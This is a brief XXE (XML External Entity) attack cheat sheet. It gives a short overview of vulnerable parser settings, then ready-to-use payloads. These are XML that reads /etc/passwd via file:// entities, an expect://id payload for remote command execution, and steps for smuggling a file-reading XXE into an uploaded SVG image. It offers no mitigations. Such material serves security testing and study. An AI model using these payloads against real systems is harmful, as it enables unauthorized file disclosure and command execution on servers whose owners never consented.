An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.

# Overview
- The application parses XML documents.
- Tainted data is allowed within the system identifier portion of the entity, within the document type declaration (DTD).
- The XML processor is configured to validate and process the DTD.
- The XML processor is configured to resolve external entities within the DTD.

# Payloads
## LFI
```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<foo>&xxe;</foo>

OR

<!DOCTYPE foo [<!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
```
## RCE
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo
  [<!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
  <user>`&xxe;`</user>
  <pass>`mypass`</pass>
</creds>
```

# XXE via Image File Upload

1. Create an SVG file with a content such as:  
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
2. Upload the SVG
3. Look for where the SVG would be displayed and the output should be embedded into the image.

# References
- [https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing#](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing#)
- [https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-advanced-xxe-vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-advanced-xxe-vulnerabilities)